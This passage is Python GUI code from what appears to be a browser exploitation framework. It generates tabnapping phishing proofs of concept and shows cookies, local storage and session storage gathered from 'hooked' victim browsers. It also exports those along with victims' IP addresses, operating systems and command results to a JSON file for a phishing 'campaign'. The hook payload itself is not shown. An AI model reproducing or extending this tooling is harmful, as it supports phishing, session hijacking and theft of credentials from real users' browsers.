        phishing_url = self.target_url.text().strip()
        if not phishing_url:
            QMessageBox.warning(self, "Error", "Enter phishing URL")
            return
        
        poc = self.bef.generate_tabnapping_poc(phishing_url)
        self.poc_output.setPlainText(poc)
        self.status_bar.setText("Tabnapping PoC generated")
    
    def refresh_results(self):
        """Refresh results from hooked browser"""
        if not self.selected_browser:
            return
        
        # Display cookies
        cookies_text = f"Cookies:\n{self.selected_browser.cookies}\n\n"
        cookies_text += f"Local Storage:\n{self.selected_browser.local_storage}\n\n"
        cookies_text += f"Session Storage:\n{self.selected_browser.session_storage}"
        self.cookies_display.setPlainText(cookies_text)
        
        # Display command results
        for result in self.selected_browser.command_results:
            # Add to appropriate display based on result type
            pass
        
        self.status_bar.setText("Results refreshed")
    
    def export_results(self):
        """Export all results"""
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Export Results", "browser_results.json",
            "JSON Files (*.json)"
        )
        
        if filepath:
            import json
            results = {
                'campaign': self.current_campaign.name if self.current_campaign else '',
                'browsers': []
            }
            
            if self.current_campaign:
                for browser in self.current_campaign.hooked_browsers.values():
                    results['browsers'].append({
                        'session_id': browser.session_id,
                        'browser': browser.browser_name,
                        'os': browser.os_name,
                        'ip': browser.ip_address,
                        'cookies': browser.cookies,
                        'local_storage': browser.local_storage,
                        'command_results': browser.command_results
                    })
            
            with open(filepath, 'w') as f:
                json.dump(results, f, indent=2)
            
            self.status_bar.setText(f"Results exported to {filepath}")


# Import for datetime
from datetime import datetime
